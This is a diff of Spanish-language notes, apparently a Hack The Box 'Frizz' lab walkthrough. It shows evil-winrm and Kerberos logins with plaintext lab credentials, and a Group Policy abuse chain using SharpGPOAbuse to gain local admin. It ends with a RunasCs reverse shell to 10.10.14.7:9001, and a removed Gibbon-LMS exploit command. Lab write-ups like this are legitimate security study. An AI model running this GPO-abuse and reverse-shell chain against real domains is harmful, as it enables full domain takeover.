@@ -127,11 +127,6 @@ Ahora por [[evil-winrm]] pero no va
 evil-winrm -i 10.10.11.60 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23'
 ```
 
-- metodo 1 con el CVE `https://www.exploit-db.com/exploits/51903`
-```bash
-python3 exploit.py 10.10.11.60 80/Gibbon-LMS/ f.frizzle@frizz.htb Jenni_Luvs_Magic23 'whoami'
-```
-![[Pasted image 20250319182500.png]]
 
 - con el [[impacket-getTGT]]
 ```bash
@@ -143,17 +138,29 @@ export KRB5CCNAME=f.frizzle.ccache
 ahora cone ste usuario podemos que en la papelera de reciclaje hay cosas
 \
 
-
-
+luego para el otro user m.school
+```bash
+kinit m.schoolbus@FRIZZ.HTB
+ssh -l m.schoolbus frizzdc.FRIZZ.HTB -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes -vvv
+```
+ 
 
 ```
 f.frizzle:Jenni_Luvs_Magic23
-m.schoolbus:!suBcig@MehTed!R 
+m.schoolbus:!suBcig@MehTed!R
 ```
 
 
-![[Pasted image 20250319194706.png]]
-
-nameserver 80.58.61.250
-nameserver 80.58.61.254
-
+cuando temos como el usuario m.schoolbus podemos escalar asi (hayn que hacerlo rapido):
+```bash
+#add new GPO  
+New-GPO -Name "doesnotmatter"  
+#add newlink to domain controllers  
+New-GPLink -Name "doesnotmatter" -Target "OU=Domain Controllers,DC=frizz,DC=htb"  
+#add m.schoolbus to localadmin group  
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName doesnotmatter  
+#force group policy update  
+gpupdate /force  
+#send yourself a revshell with admin rights:  
+.\RunasC.exe "M.SchoolBus" '!suBcig@MehTed!R' powershell.exe -r 10.10.14.7:9001
+```
